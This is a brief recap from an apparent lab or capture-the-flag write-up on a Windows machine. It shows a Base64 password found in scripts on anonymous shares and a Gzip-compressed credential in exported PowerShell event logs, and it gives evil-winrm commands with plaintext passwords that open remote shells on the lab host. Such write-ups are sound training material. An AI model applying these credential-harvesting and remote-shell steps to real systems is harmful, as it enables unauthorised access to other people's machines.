#### Recap
Anonymous access to the Users and Scripts shares exposed PowerShell scripts containing a Base64-encoded password. The decoded credential authenticated over WinRM.
```bash
evil-winrm -i 192.168.224.152 -u scripting -p 'FriendsDontLetFriendsBase64Passwords'
```
 
A desktop README pointed to a PowerShell script under the Troubleshooting directory that collected and exported event logs.
```powershell
Get-EventLog -LogName 'Windows Powershell' | Export-CSV C:\Troubleshooting\powershell-logs.csv
```
The exported log contained nested Base64 data. The inner value decoded to Gzip-compressed bytes, and decompression exposed a plaintext credential.
```bash
evil-winrm -i 192.168.224.152 -u Administrator -p 'TheShellIsMightierThanTheSword!'
```
